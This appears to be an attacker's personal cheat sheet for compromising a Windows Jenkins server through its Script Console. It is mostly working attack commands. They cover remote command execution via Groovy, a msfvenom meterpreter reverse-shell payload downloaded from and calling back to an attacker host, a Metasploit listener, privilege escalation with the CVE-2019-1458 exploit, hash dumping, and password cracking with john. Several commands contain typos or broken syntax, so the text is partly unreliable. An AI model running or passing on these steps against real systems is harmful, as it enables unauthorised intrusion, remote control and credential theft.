#Jenkins Scritp Console

#Widows victim with Jen installed

#Jenkins command via web console
println new processbuilder("cmd.exe", "/c whoami").redirectErrorStream(true).start().text

#kali
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.1.1.1 lport 4343 -f exe malware.exe
mv /var/www/html/malware.exe

#start reverse shell
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.1.1.1
set lport 4343


#Victim
println new processbuilder("powershell.exe", "Invoke-WebRequest" -uri 'http://10.1.1.1:80/malware.exe'-outfile 'c:\\somelocation\\folder\\malware.exe').redirectErrorStream(true).start().text

#to execute run the following to create session 1 on the reverse shell
println new processbuilder("malware.exe").redirectErrorStream(true).start().text

#provides session under loca service ... limited privs 

#kali to elevate privs to system - looks for potential cve's
use post/multi/recon/local_exploit_suggester
set session 1    # to the session previously established
run -j


#example of missing cve
use exploit/windows/local/cve_2019_1458_wizardopium
set session 1
run -j

#creates 2nd session with system
use post/windows/gather/hashdump
set session 2
run

john --format=NT ./passwordhash.txt
john --format=NT ./passwordhash.txt --show





